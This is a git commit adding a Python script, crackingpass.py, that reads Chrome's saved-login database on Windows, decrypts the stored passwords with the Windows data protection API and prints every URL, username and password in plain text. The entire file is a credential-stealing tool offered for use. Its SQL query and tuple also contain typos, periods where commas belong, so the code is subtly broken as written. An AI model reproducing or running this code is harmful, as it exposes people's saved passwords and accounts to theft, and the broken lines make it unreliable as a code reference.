9d7c54d5fa77c5282367ae1515ea3a4c80aae361
EdinsonRequena <edinson17286@gmail.com>
2020-01-25 20:06:04 -0400

    first

---
+++ crackingpass.py
@@ -0,0 +1,28 @@
+
+import os
+import sqlite3
+import win32crypt
+
+
+def crackPass():
+    path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
+    connect = sqlite3.connect(path)
+    cursor = connect.cursor()
+    select = 'SELECT origin_url, username_value. password_value FROM logins'
+    cursor.execute(select)
+
+    data = cursor.fetchall()
+
+    dictionary = {}
+    string = ''
+
+    for url, user_name, passwd in data:
+        passwd = win32crypt.CryptUnprotectData(passwd)
+        dictionary[url] = (user_name. passwd[1].decode('utf8'))
+        string += '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' % (url,user_name,passwd[1].decode('utf8'))
+        print(string)
+
+
+if __name__ == '__main__':
+    crackPass()
+
